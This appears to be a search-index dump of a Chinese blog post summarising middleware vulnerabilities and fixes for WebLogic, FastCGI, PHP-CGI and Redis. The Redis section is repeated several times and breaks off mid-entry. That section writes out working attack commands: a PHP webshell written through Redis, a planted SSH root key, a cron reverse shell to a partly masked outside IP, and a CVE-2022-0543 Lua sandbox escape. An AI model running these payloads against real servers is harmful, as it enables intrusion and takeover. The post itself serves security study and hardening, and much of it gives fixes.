Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 1、反序列化漏洞Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。 修复方法： 1）升级Oracle 10月份补丁。 2）对访问wls-wsat的资源进行访问控制。 2、SSRFWeblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。 修复方法： 方法一： 以修复的直接方法是将SearchPublicRegistries.jsp直接删除就好了； 方法二： 1）删除uddiexplorer文件夹 2）限制uddiexplorer应用只能内网访问 方法三：（常用） Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），更准确地说是uudi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。方法二采用的是改后辍的方式，修复步骤如下： 1）将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份 2）将weblogic安装目录下的server/lib/uddiexplorer.war下载 3）用winrar等工具打开uddiexplorer.war 4)将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx 5）保存后上传回服务端替换原先的uddiexplorer.war 6）对于多台主机组成的集群，针对每台主机都要做这样的操作 7）由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用—停server—停控制台—启控制台—启server—启应用） 3、任意文件上传通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。 修复方法： 方案1： 使用Oracle官方通告中的补丁链接： http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html https://support.oracle.com/rs?type=doc\u0026id=2394520.1 方案2: 1）进入Weblogic Server管理控制台； 2）domain设置中，启用”生产模式”。 4、war后门文件部署由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。 修复方法： 防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:6","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#4war后门文件部署"},{"categories":["hvv"],"content":"\r0x7 FastCGI\r未授权访问、命令执行服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。 **修复方法：**更改默认端口 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:7","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x7-fastcgi"},{"categories":["hvv"],"content":"\r0x7 FastCGI\r未授权访问、命令执行服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。 **修复方法：**更改默认端口 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:7","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#未授权访问命令执行"},{"categories":["hvv"],"content":"\r0x8 PHPCGI\r远程代码执行在apache调用php解释器解释.php文件时，会将url参数传我给php解释器，如果在url后加传命令行开关（例如-s、-d 、-c或-dauto_prepend_file%3d/etc/passwd+-n）等参数时，会导致源代码泄露和任意代码执行。 此漏洞影响php-5.3.12以前的版本，mod方式、fpm方式不受影响。 修复方法： 三种方法： 1）升级php版本；（php-5.3.12以上版本）; 2）在apache上做文章，开启url过滤，把危险的命令行参数给过滤掉，由于这种方法修补比较简单，采用比较多吧。 具体做法： 修改http.conf文件，找到增加以下三行 RewriteEngine on RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC] RewriteRule ^(.*) $1? [L] 重启一下apache即可，但是要考虑到，相当于每次request就要进行一次url过滤，如果访问量大的话，可能会增加apache的负担。 3）打上php补丁。 补丁下载地址:https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/ ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:8","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x8-phpcgi"},{"categories":["hvv"],"content":"\r0x8 PHPCGI\r远程代码执行在apache调用php解释器解释.php文件时，会将url参数传我给php解释器，如果在url后加传命令行开关（例如-s、-d 、-c或-dauto_prepend_file%3d/etc/passwd+-n）等参数时，会导致源代码泄露和任意代码执行。 此漏洞影响php-5.3.12以前的版本，mod方式、fpm方式不受影响。 修复方法： 三种方法： 1）升级php版本；（php-5.3.12以上版本）; 2）在apache上做文章，开启url过滤，把危险的命令行参数给过滤掉，由于这种方法修补比较简单，采用比较多吧。 具体做法： 修改http.conf文件，找到增加以下三行 RewriteEngine on RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC] RewriteRule ^(.*) $1? [L] 重启一下apache即可，但是要考虑到，相当于每次request就要进行一次url过滤，如果访问量大的话，可能会增加apache的负担。 3）打上php补丁。 补丁下载地址:https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/ ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:8","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#远程代码执行"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir /var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" //\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x9-redis"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir /var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" //\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#1未授权访问漏洞"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir /var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" //\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#2redis写入webshell"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir /var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" 